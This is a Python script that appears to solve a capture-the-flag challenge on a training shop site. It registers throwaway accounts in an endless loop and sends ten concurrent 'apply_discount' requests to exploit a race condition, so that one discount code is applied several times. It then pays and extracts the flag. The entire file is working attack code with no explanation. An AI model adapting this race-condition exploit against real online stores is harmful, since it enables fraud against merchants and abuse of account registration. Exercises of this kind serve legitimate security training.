import requests
import string
import random
import re
import threading
import time

url = "http://discount.training.offdef.it/"

def find_flag(data):
	search = re.search("flag{[a-zA-Z1-9_!?]+}", data)
	if search:
		return search.group()
	  
def find_discount_code(data):
	search = re.search("Code: (\w+)", data)
	if search:
		return search.group(1)

def gen_ran_string(size=25):
	return "".join(random.choice(string.ascii_letters) for _ in range(size))

def register(u, p):
	data = {"username": u, "password": p}
	return requests.post(url+"/register", data=data)

def login(username, password):
	payload = {'username' : username, 'password' : password}
	r = requests.post(url+"/login", data=payload)
	return r.cookies['session']

def add_to_cart(s):
	cookies = {"session": s}
	return requests.get(url+"/add_to_cart?item_id=21", cookies=cookies)

def cart(s):
	cookies = {"session": s}
	return requests.get(url+"/cart", cookies=cookies)

def apply_discount(s, discount_code):
	data = {"discount": discount_code}
	cookies = {"session": s}
	return requests.post(url+"/apply_discount", data=data, cookies=cookies)

def pay(s):
	cookies = {"session": s}
	return requests.get(url+"/cart/pay", cookies=cookies)

def items(s):
	cookies = {"session": s}
	return requests.get(url+"/items", cookies=cookies)

while True:
	u = gen_ran_string(size=50)
	p = gen_ran_string(size=50)		# big user
	r = register(u, p)				# register
	if "shop" in r.url:
		discount_code = find_discount_code(r.text)
		s = login(u, p)
		add_to_cart(s)
		
		threads=[]	
		for i in range(10):
			threads.append(threading.Thread(target=apply_discount, args=(s, discount_code)))
		
		for i in range(10):	
			threads[i].start()
		
		for i in range(10):
			threads[i].join()
		pay(s)
		print(find_flag(items(s).text))

